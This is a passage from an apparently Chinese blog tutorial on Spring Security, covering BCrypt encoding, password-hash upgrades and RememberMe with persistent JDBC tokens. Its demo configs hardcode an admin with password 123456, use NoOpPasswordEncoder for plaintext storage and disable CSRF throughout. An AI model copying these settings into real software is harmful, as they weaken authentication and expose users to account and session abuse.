class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EncodeConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WebSecurityConfigurerAdapter</span> &#123;<br><br>    <span class="hljs-meta">@Bean</span><br>    BCryptPasswordEncoder <span class="hljs-title function_">bCryptPasswordEncoder</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(AuthenticationManagerBuilder auth)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        auth.inMemoryAuthentication()<br>                .withUser(<span class="hljs-string">&quot;YH&quot;</span>)<br>                .password(<span class="hljs-string">&quot;$2a$10$697P6xxcoe904JkL8dT//OZCX9t1ZC9DzItog8NpnAVPXNdoEblHC&quot;</span>)<br>                .roles(<span class="hljs-string">&quot;admin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        http.authorizeRequests()<br>                .anyRequest()<br>                .authenticated()<br>                .and()<br>                .formLogin()<br>                .and()<br>                .csrf().disable();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个配置类就可以实现加密,密码为123456的BCryptPasswordEncoder加密,这种方式是直接用bean替换掉系统默认的DelegatingPasswordEncoder</p><p>这样就可以直接传递一个123456的密文即可</p><p>或者不进行替换而是加上一个前缀如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EncodeConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WebSecurityConfigurerAdapter</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(AuthenticationManagerBuilder auth)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        auth.inMemoryAuthentication()<br>                .withUser(<span class="hljs-string">&quot;YH&quot;</span>)<br>                .password(<span class="hljs-string">&quot;&#123;bcrypt&#125;$2a$10$697P6xxcoe904JkL8dT//OZCX9t1ZC9DzItog8NpnAVPXNdoEblHC&quot;</span>)<br>                .roles(<span class="hljs-string">&quot;admin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        http.authorizeRequests()<br>                .anyRequest()<br>                .authenticated()<br>                .and()<br>                .formLogin()<br>                .and()<br>                .csrf().disable();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="加密升级"><a href="#加密升级" class="headerlink" title="加密升级"></a>加密升级</h5><p>首先对MyUserDetailsService继续实现UserDetailsPasswordService实现后代码为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyUserDetailsService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserDetailsService</span>, UserDetailsPasswordService &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    UserMapper userMapper;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> UserDetails <span class="hljs-title function_">loadUserByUsername</span><span class="hljs-params">(String username)</span> <span class="hljs-keyword">throws</span> UsernameNotFoundException &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userMapper.loadUserByUsername(username);<br>        <span class="hljs-keyword">if</span>(user==<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UsernameNotFoundException</span>(<span class="hljs-string">&quot;用户不存在&quot;</span>);<br>        &#125;<br>        user.setRoles(userMapper.getRolesByUid(user.getId()));<br>        <span class="hljs-keyword">return</span> user;<br>    &#125;<br>    <br>    <br>    <br>    <br>    <span class="hljs-comment">//新增</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> UserDetails <span class="hljs-title function_">updatePassword</span><span class="hljs-params">(UserDetails user, String newPassword)</span> &#123;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> userMapper.updatePassword(user.getUsername(), newPassword);<br>        <span class="hljs-keyword">if</span>(i==<span class="hljs-number">1</span>)&#123;<br>            ((User) user).setPassword(newPassword);<br>        &#125;<br>        <span class="hljs-keyword">return</span> user;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>mapper中新增后结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapper</span><br><span class="hljs-meta">@Repository</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> &#123;<br><br>    List&lt;Role&gt; <span class="hljs-title function_">getRolesByUid</span><span class="hljs-params">(Integer id)</span>;<br><br>    User <span class="hljs-title function_">loadUserByUsername</span><span class="hljs-params">(String username)</span>;<br>    <br>    <br><span class="hljs-comment">//新增</span><br>    <span class="hljs-type">int</span> <span class="hljs-title function_">updatePassword</span><span class="hljs-params">(String username,String password)</span>;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>下面仅有部分代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WebSecurityConfigurerAdapter</span> &#123;<br>    <br><span class="hljs-meta">@Autowired</span><br>    MyUserDetailsService service;<br>    <br>     <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(AuthenticationManagerBuilder auth)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        auth.userDetailsService(service);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>再mapper.xml文件中新增</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;updatePassword&quot;</span>&gt;</span><br>    update user set password=#&#123;password&#125; where username=#&#123;username&#125;;<br><span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span><br></code></pre></td></tr></table></figure><p>新增完成后查看数据库</p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211015162454709.png" alt="image-20211015162454709"></p><p>刚刚使用admin登录了发现系统对其进行升级了</p><h3 id="RememberMe"><a href="#RememberMe" class="headerlink" title="RememberMe"></a>RememberMe</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RememberMeConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WebSecurityConfigurerAdapter</span> &#123;<br><br>    <span class="hljs-meta">@Bean</span><br>    PasswordEncoder <span class="hljs-title function_">passwordEncoder</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> NoOpPasswordEncoder.getInstance();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(AuthenticationManagerBuilder auth)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        auth.inMemoryAuthentication()<br>                .withUser(<span class="hljs-string">&quot;YH&quot;</span>)<br>                .password(<span class="hljs-string">&quot;123456&quot;</span>)<br>                .roles(<span class="hljs-string">&quot;admin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        http.authorizeRequests()<br>                .anyRequest()<br>                .authenticated()<br>                .and()<br>                .formLogin()<br>                .and()<br>                .rememberMe()<br>                .key(<span class="hljs-string">&quot;YH&quot;</span>)<br>                .and()<br>                .logout()<br>                .logoutUrl(<span class="hljs-string">&quot;/logout&quot;</span>)<br>                .clearAuthentication(<span class="hljs-literal">true</span>)<br>                .permitAll()<br>                .invalidateHttpSession(<span class="hljs-literal">true</span>)<br>                .and()<br>                .csrf()<br>                .disable();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>配置文件&#x3D;&#x3D;.rememberMe.key(String)&#x3D;&#x3D;这两个就可以进行</p><p>然后我们再浏览器中登录并勾选rememberMe就可以再cookie中发现</p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211018095056097.png" alt="image-20211018095056097">一个是JSESSIONID的95549F19FC543F06965A04397B83FC85,即真正的认证cookie</p><p>这种方法如果获取了rememberMe后可以无记录的登录该账号并获取该账号的权限，所以我们可以添加一个&lt;异地登陆&gt;来记录不同的会话</p><p>重写配置文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RememberMeConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WebSecurityConfigurerAdapter</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    DataSource dataSource;<br><br>    <span class="hljs-meta">@Bean</span><br>    PasswordEncoder <span class="hljs-title function_">passwordEncoder</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> NoOpPasswordEncoder.getInstance();<br>    &#125;<br><br>    <span class="hljs-meta">@Bean</span><br>    JdbcTokenRepositoryImpl <span class="hljs-title function_">jdbcTokenRepository</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">JdbcTokenRepositoryImpl</span> <span class="hljs-variable">repository</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcTokenRepositoryImpl</span>();<br>        repository.setDataSource(dataSource);<br>        <span class="hljs-keyword">return</span> repository;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(AuthenticationManagerBuilder auth)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        auth.inMemoryAuthentication()<br>                .withUser(<span class="hljs-string">&quot;YH&quot;</span>)<br>                .password(<span class="hljs-string">&quot;123456&quot;</span>)<br>                .roles(<span class="hljs-string">&quot;admin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        http.authorizeRequests()<br>                .anyRequest()<br>                .authenticated()<br>                .and()<br>                .formLogin()<br>                .and()<br>                .rememberMe()<br>                .tokenRepository(jdbcTokenRepository())<br>                .key(<span class="hljs-string">&quot;YH&quot;</span>)<br>                .and()<br>                .logout()<br>                .logoutUrl(<span class="hljs-string">&quot;/logout&quot;</span>)<br>                .clearAuthentication(<span class="hljs-literal">true</span>)<br>                .permitAll()<br>                .invalidateHttpSession(<span class="hljs-literal">true</span>)<br>                .and()<br>                .csrf()<br>                .disable();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>导入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-jdbc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>使用JdbcTokenRepositoryImpl类的CREATE_TABLE_SQL常量来创建数据库</p><p>运行并登录勾选rememberMe后到数据库中查看</p><p>可以看到一个为series一个为token(具体细节是在下一节讲到PersistentTokenBasedRememberMeServices的processAutoLoginCookie方法)</p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211018113008540.png" alt="image-20211018113008540"></p><p>有新的会话就会覆盖token,登出就会清空</p><p>由于rememberMe可能会带来不安全所以要启用二次认证来对敏感信息进行验证</p><p>例如使用rememberMe的方式登录后要访问一些敏感信息就需要转到登录页面</p><p>例子如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-meta">@RequestMapping(&quot;/index&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success Login&quot;</span>;<br>&#125;<br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-meta">@RequestMapping(&quot;/hello&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后针对不同的请求设置不同的敏感信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>       http.authorizeRequests()<br>               .antMatchers(<span class="hljs-string">&quot;/hello&quot;</span>).fullyAuthenticated()<br>               .antMatchers(<span class="hljs-string">&quot;/index&quot;</span>).rememberMe()<br>               .anyRequest()<br>               .authenticated()<br>               .and();<br>&#125;<br></code></pre></td></tr></table></figure><p>这样登录成功后无法访问&#x2F;index,关闭浏览器再重新打开可以发现能访问&#x2F;index但不能访问&#x2F;hello(需要重新登录)</p><h4 id="关于RememberMe的接口"><a href="#关于RememberMe的接口" class="headerlink" title="关于RememberMe的接口"></a>关于RememberMe的接口</h4><p>RememberMeServices一共有三个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RememberMeServices</span> &#123;<br> <span class="hljs-comment">//用于提取需要的参数进行验证</span><br>    Authentication <span class="hljs-title function_">autoLogin</span><span class="hljs-params">(HttpServletRequest var1, HttpServletResponse var2)</span>;<br><span class="hljs-comment">//登录失败的操作</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">loginFail</span><span class="hljs-params">(HttpServletRequest var1, HttpServletResponse var2)</span>;<br><span class="hljs-comment">//登录成功的操作</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">loginSuccess</span><span class="hljs-params">(HttpServletRequest var1, HttpServletResponse var2, Authentication var3)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要有三个实现</p><ul><li>AbstractRememberMeServices:用来实现RememberMeServices的三个接口<ul><li>PersistentTokenBasedRememberMeServices</li><li>TokenBasedRememberMeServices</li></ul></li></ul><p>AbstractRememberMeServices:部分源代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> Authentication <span class="hljs-title function_">autoLogin</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">rememberMeCookie</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.extractRememberMeCookie(request);<br>    <span class="hljs-keyword">if</span> (rememberMeCookie == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">this</span>.logger.debug(<span class="hljs-string">&quot;Remember-me cookie detected&quot;</span>);<br>        <span class="hljs-keyword">if</span> (rememberMeCookie.length() == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">this</span>.logger.debug(<span class="hljs-string">&quot;Cookie was empty&quot;</span>);<br>            <span class="hljs-built_in">this</span>.cancelCookie(request, response);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                String[] cookieTokens = <span class="hljs-built_in">this</span>.decodeCookie(rememberMeCookie);<br>                <span class="hljs-type">UserDetails</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.processAutoLoginCookie(cookieTokens, request, response);<br>                <span class="hljs-built_in">this</span>.userDetailsChecker.check(user);<br>                <span class="hljs-built_in">this</span>.logger.debug(<span class="hljs-string">&quot;Remember-me cookie accepted&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.createSuccessfulAuthentication(request, user);<br>            &#125; <span class="hljs-keyword">catch</span> (CookieTheftException var6) &#123;<br>                <span class="hljs-built_in">this</span>.cancelCookie(request, response);<br>                <span class="hljs-keyword">throw</span> var6;<br>            &#125; <span class="hljs-keyword">catch</span> (UsernameNotFoundException var7) &#123;<br>                <span class="hljs-built_in">this</span>.logger.debug(<span class="hljs-string">&quot;Remember-me login was valid but corresponding user not found.&quot;</span>, var7);<br>            &#125; <span class="hljs-keyword">catch</span> (InvalidCookieException var8) &#123;<br>                <span class="hljs-built_in">this</span>.logger.debug(<span class="hljs-string">&quot;Invalid remember-me cookie: &quot;</span> + var8.getMessage());<br>            &#125; <span class="hljs-keyword">catch</span> (AccountStatusException var9) &#123;<br>                <span class="hljs-built_in">this</span>.logger.debug(<span class="hljs-string">&quot;Invalid UserDetails: &quot;</span> + var9.getMessage());<br>            &#125; <span class="hljs-keyword">catch</span> (RememberMeAuthenticationException var10) &#123;<br>                <span class="hljs-built_in">this</span>.logger.debug(var10.getMessage());<br>            &#125;<br><br>            <span class="hljs-built_in">this</span>.cancelCookie(request, response);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">protected</span> String <span class="hljs-title function_">extractRememberMeCookie</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    Cookie[] cookies = request.getCookies();<br>    <span class="hljs-keyword">if</span> (cookies != <span class="hljs-literal">null</span> &amp;&amp; cookies.length != <span class="hljs-number">0</span>) &#123;<br>        Cookie[] var3 = cookies;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> cookies.length;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var5 &lt; var4; ++var5) &#123;<br>            <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> var3[var5];<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.cookieName.equals(cookie.getName())) &#123;<br>                <span class="hljs-keyword">return</span> cookie.getValue();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">protected</span> String[] decodeCookie(String cookieValue) <span class="hljs-keyword">throws</span> InvalidCookieException &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; cookieValue.length() % <span class="hljs-number">4</span>; ++j) &#123;<br>        cookieValue = cookieValue + <span class="hljs-string">&quot;=&quot;</span>;<br>    &#125;<br><br>    String cookieAsPlainText;<br>    <span class="hljs-keyword">try</span> &#123;<br>        cookieAsPlainText = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getDecoder().decode(cookieValue.getBytes()));<br>    &#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException var7) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidCookieException</span>(<span class="hljs-string">&quot;Cookie token was not Base64 encoded; value was &#x27;&quot;</span> + cookieValue + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>    &#125;<br><br>    String[] tokens = StringUtils.delimitedListToStringArray(cookieAsPlainText, <span class="hljs-string">&quot;:&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; tokens.length; ++i) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            tokens[i] = URLDecoder.decode(tokens[i], StandardCharsets.UTF_8.toString());<br>        &#125; 